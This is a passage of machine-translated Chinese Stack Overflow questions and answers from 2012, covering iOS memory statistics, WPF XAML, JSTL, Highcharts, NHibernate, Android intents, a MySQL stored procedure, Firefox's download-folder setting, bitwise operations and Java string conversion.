    host_size = sizeof(vm_statistics_data_t) / sizeof(integer_t);  
    host_page_size(host_port, &pagesize);  
    vm_statistics_data_t vm_stat;  
    if (host_statistics(host_port, HOST_VM_INFO, (host_info_t)&vm_stat, &host_size) != KERN_SUCCESS) {  
        NSLog(@"Failed to fetch vm statistics");  
        return;  
    }    

    /* Stats in bytes */  
    self.wired = vm_stat.wire_count * pagesize / (1024 * 1024);
    self.active = vm_stat.active_count * pagesize / (1024 * 1024);
    self.inactive = vm_stat.inactive_count * pagesize / (1024 * 1024);
    self.free = vm_stat.free_count * pagesize / (1024 * 1024);
    self.used = self.active + self.inactive + self.wired;
    self.total = self.used + self.free; 
```

结果如下：

*   **模拟器**：总内存 = 2045（我的电脑包含 2GB RAM）。似乎是正确的。
*   **设备（iPhone 4）**：总内存 = 390（[应该是 512](https://stackoverflow.com/a/371117/864850)）。不正确。
*   **设备（iPhone 3GS）**：总内存 = 84（[应该是 256](https://stackoverflow.com/a/371117/864850)）。不正确。

请让我知道这是否是计算iDevice**总RAM 的正确方法？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-12T09:14:52.867

您无法读取设备的总 RAM。您只能读取已用 RAM 与可用 RAM 的估计值。您的设备将始终使用一些内存（用于系统、后台应用程序、其他进程），因此您永远不会完全看到您的“应该是 512”。为什么模拟器给出一个接近的值？伙计，这是模拟器...如果您想了解 RAM，请阅读设备的技术规格。但是使用您发布的方法（如我所说），您将获得免费/使用过的内存。干杯。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-07-02T11:03:02.697

[有一个`Git`项目](https://github.com/Split82/iOSMemoryBudgetTest)显示您的`iPhone`. 它还会分配内存，直到崩溃。它保存内存警告的值以及应用程序崩溃的时间。在下一次开始时，您会在条形图上显示值。

[来源](https://stackoverflow.com/a/13425681/1141395)

![在此处输入图像描述](../Images/4b0482fbfc87001795b20737cef85841.png)

# visual-studio-2010 - 使用 TFS，我如何在解决方案资源管理器中查看旧版本的文件

> ID：11427763
> 
> 赞同：1
> 
> 时间：2012-07-11T07:34:41.703
> 
> 标签：visual-studio-2010

我正在使用 VS 2010 和 TFS。在解决方案资源管理器中，文件图标会发生变化，以指示文件是否已被其他人签出。这对团队成员非常有用，但是如果文件被其他人签出、更改然后重新签入，解决方案资源管理器不会向我表明我的本地副本已过时且已过时。

我知道我可以查看团队资源管理器下源代码控制中的“最新”列，但是这些是额外的步骤，能够在解决方案资源管理器中看到这一点会很好，可能在文件上有不同的图标老了。

是否有允许此功能的选项或扩展可用？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-13T11:19:07.117

VS 不会按时间间隔轮询更改，您必须手动进行。

您可以通过上下文菜单获取文件的最新版本，如果进行了更改，您会看到一个冲突对话框。

另一个我真的不知道的解决方案。

# c# - 将事件添加到 xaml

> ID：11427764
> 
> 赞同：0
> 
> 时间：2012-07-11T07:34:48.007
> 
> 标签：c#, wpf

如何添加属性`Name`或`x:Name`此 XAML 代码（在组合框中）：

```
<DataGridTemplateColumn Header="Status">
    <DataGridTemplateColumn.CellTemplate>
        <DataTemplate>
            <TextBlock VerticalAlignment="Center" Text="{Binding name_ru}" Width="Auto" />
        </DataTemplate>
    </DataGridTemplateColumn.CellTemplate>
    <DataGridTemplateColumn.CellEditingTemplate>
        <DataTemplate>
            <ComboBox Style="{DynamicResource ComboBoxStyle}" SelectionChanged="status_SelectionChanged" Height="auto" Width="Auto">
                 <ComboBox.BorderBrush>
                     <SolidColorBrush Color="{DynamicResource Color1}"/>
                 </ComboBox.BorderBrush>
            </ComboBox>
        </DataTemplate>
    </DataGridTemplateColumn.CellEditingTemplate>
</DataGridTemplateColumn> 
```

`Click`以及如何在此 XAML 代码中添加事件或其他：

```
<!--Clien-->
<DataGridTemplateColumn Header="Client name" HeaderStyle="{DynamicResource DataGridColumnHeaderStyle1}">
    <DataGridTemplateColumn.CellTemplate>
        <DataTemplate>
            <TextBlock  VerticalAlignment="Center" Text="{Binding user_name}"  Width="Auto" Height="Auto" />
        </DataTemplate>
    </DataGridTemplateColumn.CellTemplate>
</DataGridTemplateColumn>
<!--end Clien--> 
```

我的顶级 xaml：

```
<Window
  xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
   xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
     xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
      xmlns:Microsoft_Windows_Themes="clr-namespace:Microsoft.Windows.Themes;assembly=PresentationFramework.Classic"
       xmlns:ei="http://schemas.microsoft.com/expression/2010/interactions"
        xmlns:ee="http://schemas.microsoft.com/expression/2010/effects"
         xmlns:System="clr-namespace:System;assembly=mscorlib"
          mc:Ignorable="d"
    x:Class="JanPizza.IndexFormPizza"
    x:Name="MainWnd"
    Title="MainWindow"
    MouseLeftButtonDown="MainWnd_MouseLeftButtonDown"
    ResizeMode="CanResizeWithGrip"
    xmlns:wpftoolkit="http://schemas.microsoft.com/wpf/2008/toolkit"
    xmlns:filter="clr-namespace:DataGridFilterLibrary;assembly=DataGridFilterLibrary"    

    Width="1065" Height="674" Background="{x:Null}" BorderThickness="0" Margin="5" WindowStartupLocation="CenterScreen" Foreground="#FF2D2D2D" Icon="wnd-icon.png" Style="{DynamicResource WindowStyle}" AllowsTransparency="True" WindowStyle="None" AllowDrop="False"> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:44:14.823

只需使用以下属性：

```
<ComboBox Name="myCombobox" ... /> <TextBlock MouseLeftButtonDown="textblock_mouseLeftButtonDown" ... /> 
```

# map - EL 空状态未按预期工作

> ID：11427768
> 
> 赞同：0
> 
> 时间：2012-07-11T07:35:09.020
> 
> 标签：map, vector, foreach, jstl

我有一个jsp，它接收（验证后）一个`Map<String, Vector<ErrorMessage>>`称为errorList。这包含页面上的每个属性的错误列表。相同的 jsp 也用于数据的初始输入，在这种情况下，将没有可用的映射。

**因此，我创建了以下表达式：**

```
<c:if test="${not empty errorList}">
    <div class="warningbox">
        <div class="warning">
            <c:forEach var="error" items="${errorList['PropertyAttribute.KIND']}"/>
                test: ${error.errorMessage}
            </c:forEach>
        </div>
    </div>
</c:if> 
```

**我期望的事情：**
1.第一次填写表单时，errorList不存在（甚至通过检查request.getAttributeNames（）来验证。因此不应该执行if主体。不是真的，实际上if主体是执行...**为什么**？
2.当Vector为空时，永远不应该执行forEach主体。实际上页面上的结果是“test：”。这简直是荒谬的。

也许不是一个不重要的事实。我使用**谷歌应用引擎**。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T11:03:19.237

我看到了三种可能性：

1.  （`errorList`实际上应该命名为errorMap）存在于请求属性中，而不是空的（但你排除了）
2.  有一个名为的页面、会话或应用程序范围属性`errorList`不为空。您可以使用`${not empty requestScope.errorList}`.
3.  您在页面上看到“test”是因为 EL 被忽略或者因为核心标记库未在您的 JSP 中声明。检查生成的 HTML 代码以查看其外观。

# tooltip - highcharts 工具提示 usehtml 不起作用

> ID：11427770
> 
> 赞同：1
> 
> 时间：2012-07-11T07:35:30.453
> 
> 标签：tooltip, highcharts

我使用了 highcharts 并使用了“usehtml=true”，以便以 3 行显示文本并为其中之一着色。

工具提示的代码是

```
tooltip:
{
    useHTML: true,
    formatter: function()
    {
        var color = "";
        if (this.point.config[2]>0) color = "green";
        else if (this.point.config[2]<0) color = "red";
        return '<div style="direction:rtl;"' +
            '<p>שעה:' + Highcharts.dateFormat('%H:%M:%S', this.x) +'</p> <p>indice:'+ this.y + '</p><p> change:</p>' 
            + "<p class='"+color+"'>" + this.point.config[2] + "</p>"+'</div>';
    }
}, 
```

您可以在此处查看实际操作 [http://s-maof.com/PRO/index3.php?fkapp=2](http://s-maof.com/PRO/index3.php?fkapp=2)（将鼠标悬停在此处的 6 个框之一上）。

具有讽刺意味的是，它适用于 IE8（我也认为 9）但不适用于 FF 和 chrome（有趣..）

就是这样，有什么建议吗？

编辑：

我发现highcharts 2.1.4不支持useHTML属性，所以我升级到2.2.5，你可以在这里查看 [http://s-maof.com/PRO/index4.php?fkapp=2](http://s-maof.com/PRO/index4.php?fkapp=2)

但现在图表根本不显示，也尝试升级我的 jquery 版本，但什么也没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-07T10:23:29.820

您的 HTML 不完整：

```
'<div style="direction:rtl;"' + 
```

应该 ：

```
'<div style="direction:rtl;">' + 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-02T11:24:56.727

你必须这样设置方向：

```
tooltip: {
 useHTML: true,
 formatter: function() {
 return '<div lang="fa" dir="rtl"> ' +
 this.x + ' : ' + this.y +
 '</div>';
  }
}, 
```

# c# - 流利的 nhibernate hasone 不使用引用的 notfound 忽略

> ID：11427773
> 
> 赞同：1
> 
> 时间：2012-07-11T07:35:41.703
> 
> 标签：c#, nhibernate, fluent-nhibernate

我的映射有一个奇怪的问题。

我有一个类可以调用它`Order`，它可以与自身有关系（将其视为一种链式的东西）。`Order`在“链”中不必有新的或旧的。

该问题与此类中不同的引用可为空的属性有关`Order`。该属性，我们称之为它`Person`，具有`NotFound.Ignore()`设置。

person 属性引用了一个不存在的对象。当我加载一个订单时，该引用会抛出一个 ObjectNotFoundException ( `No row with the given identifier exists`)。但是，由于我有`NotFound.ignore`，我希望该对象为空。

这是我的对象：

```
public virtual int PersonId { get; set; }
public virtual Person Person { get; set; }
public virtual int OldOrderId { get; set; }
public virtual Order OldOrder { get; set; }
public virtual Order NewOrder { get; set; } 
```

这是我的映射：

```
Map(x => x.PersonId. "person_id").Default("0");
Reference(x => x.Person, "person_id")
            .Not.Update()
            .Not.Insert()
            .NotFound.Ignore()
            .Not.LazyLoad();

Map(x => x.OldOrderId, "oldorder_id").Default("0");
References(x => x.OldOrder , "oldorder_id")
             .Not.Update()
             .Not.Insert();

HasOne(x => x.NewOrder)
             .PropertyRef(x => x.OldOrder)
             .Cascade.SaveUpdate(); 
```

当我将`.Constrained()`设置添加到“HasOne”映射时，`Person`返回为 null（这是正确的）。但在那种情况下，没有`NewOrder`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-12T09:36:55.350

原因是您映射了两次外键列并将默认值设置`0`为 NHibernate 的合法 id 并且没有引用任何内容。

你必须插入 NHibernate 来改变它，因为如果它是延迟加载的，它将创建一个没有 notfound.ignore 的代理

[外键中的 0 到空引用](https://bitbucket.org/jfromaniello/hotgazpachoeg/changeset/87ac41c473ae)

# android - 通知意图标志

> ID：11427782
> 
> 赞同：0
> 
> 时间：2012-07-11T07:36:34.697
> 
> 标签：android, android-intent

在我有两个活动的应用程序中，活动 A 有一个按钮，活动 B 有音频播放器，带有通知内容和 HOME 选项菜单。

1.  启动活动 A。单击按钮 -> 开始活动 B
2.  在活动 B 中 - 开始播放器并发出通知。
3.  单击设备返回按钮
4.  Activity B 销毁并单击设备返回按钮
5.  活动 A 销毁
6.  点击通知 -> 转到活动 B
7.  在活动 B 单击 HOME 选项菜单 -> 开始活动 A
8.  单击按钮 - 不工作

任何想法？

```
Intent i = new Intent(getBaseContext(),ActivityB);
    i.putExtra("NotifID", NOTIFICATION_ID);
    i.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);  

    pi = PendingIntent.getActivity(getBaseContext() , 0, i,PendingIntent.FLAG_UPDATE_CURRENT); 
    contentView = new RemoteViews(getPackageName(), R.layout.my_notification);

         bitmap = ((BitmapDrawable)drawable).getBitmap();
    contentView.setImageViewBitmap(R.id.imageNotify, bitmap); 
    contentView.setTextViewText(R.id.titleNotify, text);
    contentView.setTextViewText(R.id.textSong, singer);   
    mNotification.contentView = contentView;
    mNotification.contentIntent = pi;
    mNotification.tickerText = text;
    mNotification.icon = R.drawable.icon;

    mNotification.flags |= Notification.FLAG_ONGOING_EVENT;
    mNotificationManager.notify(NOTIFICATION_ID, mNotification); 
```

**活动A，**

```
 playButton = ((Button)findViewById(R.id.nowplaying));
            playButton.setOnClickListener(new OnClickListener() {
        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
Intent intent = new Intent(getBaseContext(),ActivityB.class);
intent.putExtra("isFromList", false);
startActivity(intent);  
        }
    }); 
```

**在活动 B 中，**

```
 @Override
  public boolean onOptionsItemSelected(MenuItem item) {
    switch (item.getItemId()) {
    case R.id.home:
        Intent myIntent = new Intent(this, ActivityA.class);
        startActivity(myIntent); 
        break; 
```

并用于上述通知。

**显现**

```
 <activity
        android:name="com.android.ActivityA"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:configChanges="orientation|keyboardHidden"
        android:label="@string/app_name"
        android:screenOrientation="portrait" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
          <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

       <activity
        android:name="com.android.ActivityB"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:configChanges="orientation|keyboardHidden"
        android:screenOrientation="portrait" >
    </activity> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T10:44:43.950

我假设当用户从 ActivityB 选择“HOME 菜单选项”来启动 ActivityA 时，您想要“回到 ActivityA”。在这种情况下，您需要在启动 ActivityA 后添加对`finish()`in的调用。`onOptionsItemSelected()`

我已要求您将清单条目发布到 ActivityA 和 ActivityB，这可能会更清楚地说明问题。

# ruby-on-rails - 将电子表格单元格值与 ruby 中的字符串进行比较

> ID：11427785
> 
> 赞同：0
> 
> 时间：2012-07-11T07:36:57.973
> 
> 标签：ruby-on-rails, ruby, parseexcel

嗨，我正在尝试将 spreadhseet 中的单元格值与下面给出的字符串进行比较。

```
workbook = Spreadsheet::ParseExcel.parse(name)

#Get the first worksheet
worksheet = workbook.worksheet(0)
puts worksheet.cell(4,0).to_s 
puts "SecurityKey".to_s
puts "SecurityKey".to_s.eql? worksheet.cell(4,0).to_s 
```

我尝试了`==`,`.eq?`和所有其他可能的字符串比较技术，但即使两个字符串相同，它也总是结果为假。你能帮帮我吗？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:45:04.290

> 一个单元对象有许多子对象和方法。Value（读/写）方法返回 Cell 内部存储的值。单元格的 Text（只读）方法返回当前显示的值。例如，如果单元格的值“1234.56789”格式化为货币，则 Value 和 Text 方法返回不同的值
> 
> [http://rubyonwindows.blogspot.com/2007/04/automating-excel-with-ruby-rows-columns.html](http://rubyonwindows.blogspot.com/2007/04/automating-excel-with-ruby-rows-columns.html)

尝试使用值或文本

```
worksheet.Cells(4, 0).Value == "SecurityKey"
worksheet.Cells(4, 0).Text == "SecurityKey" 
```

**编辑**

避免使用 parseexcel。尝试类似的东西

```
require 'spreadsheet'

Spreadsheet.client_encoding = 'UTF-8'
workbook = Spreadsheet.open '/path/to/file.xls'
first_sheet = workbook.worksheet 0 # or name
cell = first_sheet.row(1).at(4) 
```

# mysql - MySQL - 存储过程不返回结果集

> ID：11427786
> 
> 赞同：0
> 
> 时间：2012-07-11T07:37:09.583
> 
> 标签：mysql

我在 MySQL 5.5.22-Ubuntu 上创建了一个过程，在我的测试中它应该返回四行，但它没有返回任何内容。我已经读过返回结果集会很困难，我尝试了一些方法，但都没有奏效（作为选择...进入@result...）。另外，我试图从程序中运行选择，它正在返回，但是当我运行程序时，它什么也不返回。有人可以帮助我吗？

请参阅下面我的程序代码：

```
DELIMITER $$

DROP PROCEDURE IF EXISTS `switchboard3b-scheduler`.`getCurrentAndNextScheduleItem`$$ 

CREATE DEFINER=`root`@`localhost` PROCEDURE `getCurrentAndNextScheduleItem`(IN screenId int, IN scheduleId int 

-- , OUT cursorScheduleItems int

)

BEGIN

-- select current item

 -- declare cursorScheduleItems cursor for 

(SELECT "CURRENT_ITEM" as "ITEM", si.id,si.start_time,si.end_time, si.play_through, c.filename,ct.command 

FROM schedule_item si JOIN channel_content cc ON si.channel_content_id = cc.id 

    JOIN content c ON cc.content_id = c.id 

    JOIN content_type ct ON c.content_type_id = ct.id 

WHERE si.channel_screen_id = @screenId 

    AND si.schedule_id = @scheduleId

    AND (si.day=0 OR si.day=DAYOFWEEK(DATE(NOW()))) 

    AND si.start_time <= NOW() 

    AND si.end_time > NOW() 

ORDER BY si.day DESC, si.start_time DESC LIMIT 1)

-- select next item for that day

UNION ALL

(SELECT "NEXT_ITEM_TODAY" as "ITEM", si.id,si.start_time,si.end_time, si.play_through, c.filename,ct.command 

FROM schedule_item si JOIN channel_content cc ON si.channel_content_id = cc.id 

    JOIN content c ON cc.content_id = c.id 

    JOIN content_type ct ON c.content_type_id = ct.id 

WHERE si.channel_screen_id = @screenId 

    AND si.schedule_id = @scheduleId

    AND (si.day=0 OR si.day=DAYOFWEEK(DATE(NOW()))) 

    AND si.start_time > NOW()

ORDER BY si.day DESC, si.start_time ASC LIMIT 1)

-- select first two items of the next day

UNION ALL

(SELECT "NEXT_ITEMS_TOMORROW" as "ITEM", si.id,si.start_time,si.end_time, si.play_through, c.filename,ct.command 

FROM schedule_item si JOIN channel_content cc ON si.channel_content_id = cc.id 

    JOIN content c ON cc.content_id = c.id 

    JOIN content_type ct ON c.content_type_id = ct.id 

WHERE si.channel_screen_id = @screenId 

    AND si.schedule_id = @scheduleId

    AND (si.day=0 OR si.day=DAYOFWEEK(DATE(NOW()+1)))

ORDER BY si.day DESC,si.start_time ASC LIMIT 2);

-- CLOSE cursorScheduleItems;

END $$

DELIMITER ; 
```

我尝试使用以下命令调用它：

```
CALL getCurrentAndNextScheduleItem(1,4); 
```

任何提示将不胜感激。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:41:59.910

你想返回什么？创建过程中未提及其类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:53:36.367

可能是您的“out”参数注释为-

```
-- , OUT cursorScheduleItems int 
```

# c# - 获取 Firefox 下载文件夹

> ID：11427790
> 
> 赞同：0
> 
> 时间：2012-07-11T07:37:19.643
> 
> 标签：c#, firefox, download, directory

Windows 7 中的默认下载文件夹是 Firefox 的 c:\users\username\downloads。但是可以通过设置将默认下载文件夹设置为另一个文件夹。我需要找出哪个文件夹是下载文件夹。因此，如果我将下载文件夹设置为 c:\dd，那么我需要找出**那个特定的文件夹**。

有没有办法使用 C# 来解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:42:21.737

默认下载文件夹 c:\users\username\downloads 不仅适用于 Firefox，而且适用于整个 Windows。

因此，如果您更改 Firefox 中的下载文件夹，它将特定于 Firefox。我的猜测是该设置保存在注册表中的某个位置。因此，找到正确的注册表项，使用您的 C# 代码读取它，您应该能够使用它！

- 编辑 -

小调查得知 Firefox 将所有配置保存在配置文件文件夹中。在`C:\Users\user\AppData\Roaming\Mozilla\Firefox`其中有一个文件`profiles.ini`，您可以获取与当前用户关联的配置文件文件夹。从那里您可以进入文件夹并从正确的文件中获取配置的下载文件夹。可能是 prefs.js？

-- 编辑 2 --

prefs.js 似乎是正确的，当您配置了默认下载文件夹之外的另一个文件夹时，应该有一行类似于`user_pref("browser.download.dir", "C:\\Users\\user\\Desktop");`

# php - 无法理解简单的算法

> ID：11427791
> 
> 赞同：2
> 
> 时间：2012-07-11T07:37:21.123
> 
> 标签：php, javascript, algorithm, infinite-loop

对这样一个具体问题感到抱歉，但在查看以下用 Javascript 编写的算法时

```
 function c(a) {
    if (a < 2) return 2;
    if (a > 4096) return 4096;
    var b = a & (a - 1);
    while (b > 0) {
        a++;
        b = a & (a - 1)
    }
    return a
} 
```

我遇到了一个我不确定的声明。究竟`var b = a & (a - 1);`是做什么的？我假设它将A分配给B，然后从B中减去1，但是，如果是这种情况，那么B不会永远达到0（或低于0）导致无限循环吗？这怎么行？

我问这个是因为我试图使算法适应 PHP，但碰壁了。它在 Javascript 中完美运行，所以我确定我不明白发生了什么。这是我在 PHP 中的尝试：

```
function c($a) {
    if ($a < 2) return 2;
    if ($a > 4096) return 4096;
        $b = $a 
        $b = ($b - 1);
    while ($b > 0) {
        $a++;
        $b = $a;
        $b -= 1;   
    }
    return $b;
} 
```

我可以清楚地看到为什么它不起作用，但我不确定如何更改算法以使其起作用。或多或少，我知道我没有正确调整算法，因为我不明白它在 Javascript 中是如何工作的。

不管怎样，请帮助我！我并不特别希望有人为我解决我的问题，但正确方向的提示会非常棒。:(

非常感谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-11T07:41:26.650

该行清除 的值中*的最低设置位*`a`并将结果分配给`b`。

例子：

```
00010100110101111000 
```

变成：

```
00010100110101110000
                ^ 
```

它起作用的原因是减一会翻转所有位，直到并包括设置的最低有效位。所有其他位保持不变。使用按位并保留所有未更改的位。

```
00010100110101111000  a
00010100110101110111  a-1
00010100110101110000  a & (a-1) 
```

* * *

这个循环反复加一，`a`直到清除一位`a`得到零：

```
b = a & (a - 1);
while (b > 0) {
    a++;
    b = a & (a - 1);
} 
```

换句话说，它`a`以非常低效的方式四舍五入到最接近的 2 次方！

**有关的**

*   [Bit Twiddling Hacks - 向上取整到 2 的下一个最高幂](http://graphics.stanford.edu/~seander/bithacks.html#RoundUpPowerOf2)
*   [什么是按位移位（bit-shift）运算符，它们是如何工作的？](https://stackoverflow.com/questions/141525/absolute-beginners-guide-to-bit-shifting)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T07:40:47.100

那是按位运算：

[http://en.wikipedia.org/wiki/Bitwise_operation](http://en.wikipedia.org/wiki/Bitwise_operation)

[http://php.net/manual/en/language.operators.bitwise.php](http://php.net/manual/en/language.operators.bitwise.php)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-11T07:41:51.563

这是相同的。

```
function c($a) {
    if ($a < 2) return 2;
    if ($a > 4096) return 4096;
    $b = $a & ($a - 1);
    while ($b > 0) {
       $a++;
       $b = $a & ($a - 1);
    }
    return $b;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-11T07:41:53.743

我认为它返回最接近 2 的下一个幂。对于 2 的幂，a & (a-1) 返回 0。

编辑：

我刚刚在Java中检查了这个。它确实返回 2 的下一个幂。当 a 为 6 时，它返回 8。当 a 为 9 时，它返回 16。如果 a 为 2，它返回 2。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-11T07:42:18.783

```
a & (a-1) 
```

将按位与 a 和 (a-1)

在php中

```
$b = $a & ($a-1) 
```

也应该工作。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-11T07:55:54.617

```
a & (a-1); 
```

`a`该语句在和之间进行按位与运算`a-1`。[此](http://en.wikipedia.org/wiki/Bitwise_operation)链接向您解释按位操作。在 PHP 中，您可以使用`&`运算符进行 AND 操作。[这](http://php.net/manual/en/language.operators.bitwise.php)是与PHP相关的链接。

# java - 哪个是在java中进行投射的更好方法

> ID：11427793
> 
> 赞同：3
> 
> 时间：2012-07-11T07:37:29.940
> 
> 标签：java, type-conversion

在我编码的各个地方，我需要将整数值更改为字符串值。要将强制转换整数转换为字符串，我使用**将 "" 连接到整数**。

我发现了另一种使用**String.parseInt(..);** 方法。

我的问题是我不知道在 java 中进行铸造的优化方法是什么以及它是如何优化的？除了我的代码，还有其他方法可以转换吗？

我的示例代码：

```
int total = mark1 + mark2;
String str_total = ""+total;  // currently doing. 
```

…………

```
String str_total = String.parseInt(total);  // i am planning to do. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:39:29.410

您还可以使用 -

```
String str_total = String.valueOf(total); 
```

或者

在代码中使用 Integer rahter than int 然后在 Integer 上使用 toString()

```
Integer total = mark1 + mark2;
String str_total = total.toString(); 
```

在您的代码中 -

字符串 str_total = "" + 总计；

实际上，您首先创建了 2 个新的字符串对象，`""`然后是`str_total`

但在我的代码中只会`one new string object`被创建。

String 类中 valueOf 的实现如下 -

```
 public static String valueOf(int i) {
        return Integer.toString(i);
    } 
```

这里 toString 将创建一个新的 String 对象

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:52:20.497

该`String.valueOf(int)`方法调用`Integer.toString(int)`.

进行字符串连接（`""+i`），首先`i`转换为an `Integer`，然后`Integer.toString`调用该函数以获取`String`整数的值。

因此调用`String.valueOf(int)`将比字符串连接执行得更好，因为它跳过了`Integer`对象的创建。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:42:35.950

```
String str_total = String.valueOf(total); 
```

`String.valueOf(int)`比`""+int`所以更喜欢使用更有效`String.valueOf(int)`

有关性能测量，请参阅[此](http://java.dzone.com/articles/stringvalueofint-vs-int)链接。

在 Jdk > 1.5 你也可以使用它。

```
String str_total= String.format ("%d", total); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:43:42.457

另一种方法：

```
int intValue = 1;    
String str1 = String.format("%d", intValue); 
```

您还可以控制值的显示方式（前导零、基数等）。[在这里](http://docs.oracle.com/javase/6/docs/api/java/util/Formatter.html#syntax)找到更多信息。

很酷的一点是，在我看来，这

```
String str2 = String.format("Blabla %d blupp %dm etc", intValue1, intValue2); 
```

看起来更具可读性（如果您熟悉格式），那么

```
String str3 = "Balbla " + intValue1 + " blupp " + intValue2 + "m etc"; 
```

（+ 你可以更好地控制它的显示方式）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-11T07:57:13.133

由于`Integer`不能保持如此大的值，这将导致它用科学记数法表示，我认为

```
Integer.toString() 
```

将完全工作。

如果你想以某种方式格式化你的号码，你应该`NumberFormat`像这样使用：

```
Integer myInt = 31535468;
NumberFormat nf = NumberFormat.getInstance();
String myString = nf.format(myInt); 
```

我认为使用`NumberFormat`是这里最传统的方式。

# jquery - 在同一行上查找 div 的 JQuery 选择器？

> ID：11427795
> 
> 赞同：0
> 
> 时间：2012-07-11T07:37:42.707
> 
> 标签：jquery, asp.net-mvc, drop-down-menu, jquery-selectors

好的，我正在开发一个 ASP.NET-MVC Web 应用程序，该应用程序有一个包含多行和多列下拉列表的页面。我的意图是根据第 1 列中 DDL 的选择启用/禁用第 2 列和第 3 列中的 DDL。

到目前为止，我只能同时启用/禁用整个页面上的所有 DDL。我需要弄清楚如何使事件仅在与特定行上的 DDL 相关时触发。

到目前为止，这是我的代码：

HTML --

```
<select class="med" id="SubTrades_1__Condition" name="SubTrades[1].Condition"><option     value="">- Select -</option>
<option value="N/A">N/A</option>
<option value="Missing">Missing</option>
<option value="New">New</option>
<option value="Excellent">Excellent</option>
<option value="Good">Good</option>
<option value="Fair">Fair</option>
<option value="Poor">Poor</option>
<option value="Very Poor">Very Poor</option>
</select>

<select class="med" id="SubTrades_1__Quality" name="SubTrades[1].Quality" disabled="disabled"><option value="">- Select -</option>
<option value="Designer">Designer</option>
<option value="Custom">Custom</option>
<option value="Semi-Custom">Semi-Custom</option>
<option value="Builder">Builder</option>
<option value="Basic">Basic</option>
<option value="Economy">Economy</option>
</select>

<select class="med" id="SubTrades_1__Age" name="SubTrades[1].Age" disabled="disabled">        <option value="">- Select -</option>
<option value="Original to home">Original to home</option>
<option value="Brand New/Recent Upgrade">Brand New/Recent Upgrade</option>
<option value="1 to 3 Years">1 to 3 Years</option>
<option value="4 to 6 Years">4 to 6 Years</option>
<option value="7 to 10 Years">7 to 10 Years</option>
<option value="11 to 15 Years">11 to 15 Years</option>
<option value="16 to 20 Years">16 to 20 Years</option>
<option value="21 to 30 Years">21 to 30 Years</option>
<option value="31 to 40 Years">31 to 40 Years</option>
<option value="41 to 50 Years">41 to 50 Years</option>
<option value="Over 50 Years">Over 50 Years</option>
</select> 
```

我的脚本：

```
$("[name][name$='Quality']").prop("disabled", true);

$("[name][name$='Age']").prop("disabled", true);

$("[name][name$='Condition']").change(function () {

if ($(this).val() == "" || $(this).val() == "N/A" || $(this).val() == "Missing") {

    $("[name][name$='Quality']").attr('disabled', 'disabled');
    $("[name][name$='Age']").attr('disabled', 'disabled');
}

else {
    $("[name][name$='Quality']").removeAttr('disabled');
    $("[name][name$='Age']").removeAttr('disabled');
}
}); 
```

您的帮助将不胜感激。每个元素的 ID 是动态生成的，因此我需要代码能够适应包含新 ID，因为用户将能够添加新行。ID 每行增加一个数字，因此应该很容易匹配 Column1/Row1（即“Condition_1”）和 Column2/Row1（即“Quality_1”）。感谢您的输入。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T22:44:55.763

我无法相信这个解决方案实际上是多么简单。我认为我的睡眠不足导致我忽略了显而易见的事情。无论如何，这是我自己问题的答案......希望它可以帮助某人:)

```
$("[name][name $='Quality']").prop("disabled", true);

$("[name][name $='Age']").prop("disabled", true);

$("[name][name$='Condition']").change(function () {

var parentDDL = $(this).closest('div');

if ($(this).val() == "" || $(this).val() == "N/A" || $(this).val() == "Missing") {

    $("[name][name$='Quality']", $(parentDDL)).attr('disabled', 'disabled');
    $("[name][name$='Age']", $(parentDDL)).attr('disabled', 'disabled');
}

else {
    $("[name][name$='Quality']", $(parentDDL)).removeAttr('disabled');
    $("[name][name$='Age']", $(parentDDL)).removeAttr('disabled');
}
}); 
```

我只是添加了一个 var，将操作绑定到包含第一个 DDL 的最近 div：

```
var parentDDL = $(this).closest('div'); 
```

然后我将 var 添加到我的 if else 语句中：

```
 $("[name][name$='Quality']", $(parentDDL)).attr('disabled', 'disabled'); 
```

如果有人有更有效的建议，我愿意接受反馈。谢谢。

# javascript - 使用 ShowModalDialog 使用来自 asp.net 代码后面的查询字符串传递值

> ID：11427807
> 
> 赞同：0
> 
> 时间：2012-07-11T07:38:31.920
> 
> 标签：javascript, asp.net

我正在从后面的 ASP.Net 代码打开一个 javascript ShowModalDialog，代码如下所述：-

